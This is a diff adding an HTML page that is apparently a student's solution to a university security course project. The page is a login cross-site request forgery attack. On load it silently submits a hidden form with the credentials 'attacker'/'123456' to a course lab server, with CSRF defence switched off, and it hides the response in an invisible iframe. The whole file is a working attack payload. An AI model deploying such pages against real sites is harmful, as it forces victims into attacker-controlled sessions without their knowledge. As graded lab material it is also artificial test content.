@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>about:blank</title>
+    <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+</head>
+
+<body>
+    <form id="login" action="http://cs526-s18.cs.purdue.edu/project3/login?csrfdefense=0&xssdefense=4" method="post" target="hidden-frame"> 
+        <input name="username" value="attacker" type="hidden">
+        <input name="password" value="123456" type="hidden">
+    </form>
+    <iframe name="hidden-frame" style="display: none;"></iframe>
+    <script>
+        $("#login").submit();
+    </script>
+</body>
+
+</html>
